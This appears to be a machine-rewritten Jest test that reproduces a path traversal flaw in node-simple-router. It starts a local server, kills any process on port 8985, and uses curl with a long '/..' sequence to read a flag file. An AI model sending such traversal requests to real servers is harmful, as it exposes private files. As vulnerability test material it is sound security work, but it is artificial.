const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v20 = '/..'.repeat(50);
    const v21 = v20 + pathToFlag;
    return v21;
};
const v37 = done => {
    const v22 = expect.assertions(1);
    v22;
    const Router = require('node-simple-router');
    const http = require('http');
    const fs = require('fs');
    const v23 = require('child_process');
    const exec = v23.exec;
    const v24 = fs.readFileSync(pathToFlag);
    let hostsFile = v24.toString();
    const a = require('child_process');
    try {
        const v25 = () => {
        };
        const v26 = a.execSync('fuser -k 8985/tcp', v25);
        v26;
    } catch (e) {
    }
    const v27 = process.cwd();
    const v28 = [];
    const v29 = {
        static_route: v27,
        cgi_dir: 'cgi-bin',
        use_nsr_session: false,
        default_home: v28
    };
    let router = new Router(v29);
    const server = http.createServer(router);
    const v30 = server.listen(8985);
    v30;
    const v31 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8985${ v31 }"`;
    const v35 = (error, stdout) => {
        const v32 = expect(stdout);
        const v33 = v32.toBe(hostsFile);
        v33;
        const v34 = done();
        v34;
    };
    const v36 = exec(attack_string, v35);
    v36;
};
const v38 = test('Path Traversal in node-simple-router', v37);
v38;